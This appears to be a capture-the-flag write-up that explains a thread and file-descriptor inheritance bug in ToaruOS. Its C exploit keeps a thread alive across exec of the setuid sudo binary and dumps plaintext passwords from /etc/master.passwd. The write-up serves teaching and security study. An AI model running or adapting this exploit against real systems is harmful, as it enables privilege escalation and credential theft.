---
layout: post
description: I like cheese with lots of holes. 🪤🫕🐭
---

We are given an image of the latest release of the [ToaruOS project](https://github.com/klange/toaruos)
and access to a shell as the `local` user. The goal is to read `/flag.txt` owned by root.

There are multiple vulnerabilities in the project, but the one I used resides in the way the OS handles
threads inside processes.

The `pthread_create` implementation calls `sys_clone`:
![](images/01.png)

`sys_clone` will call `clone` from `process.c`:
![](images/02.png)

This function will call `spawn_process` with the last argument (flags) set to 1.
This is the equivalent for `PROC_REUSE_FDS`, which, when set, will simply reuse the 
FD table for the new thread (process):
![](images/03.png)

The problem is that when `exec`-ing a new image, the threads created are not stopped.
This means that you can have a thread inside a new process and access every FD from it.
The thread will have a different address space, of course, but having access to the FD list
is enough to achieve privilege escalation.

The `sudo` binary has the `setuid` bit set (similar to Linux). It uses a custom library
called `libauth` to check the credentials, which opens `/etc/master.passwd`. The credentials 
are also stored in plaintext.

Having access to the FD list of the `sudo` process, we can bruteforce the FDs to read the passwords:

{% prism c %}
#include <unistd.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/signal_defs.h>
#include <sys/uregs.h>
#include <pthread.h>
#include <errno.h>

void* threadHandler(void* _unused) {
  for (;;) {
    usleep(100);
    for (int fd = 3; fd < 7; fd += 1) {
      char content[1024] = { 0 };
      int bytesRead = read(fd, content, sizeof content);
      if (bytesRead <= 0) {
        continue;
      }
      printf("%s\n", content);
    }
  }

  return NULL;
}

void threadThing() {
  pid_t pid = fork();

  if (pid < 0) {
    printf("Error forking: %d (%s)\n", errno, strerror(errno));
    exit(-1);
  }

  int isChild = pid == 0;

  if (isChild) {
    pthread_t thread;
    pthread_create(&thread, NULL, threadHandler, NULL);
    char* args[] = { "/bin/sudo", "-s", NULL };
    execvp(args[0], args);
  } else {
    waitpid(pid, NULL, 0);
  }
}

int main() {
  threadThing();
}
{% endprism %}

After multiple runs, the exploits successfully dumps the password list.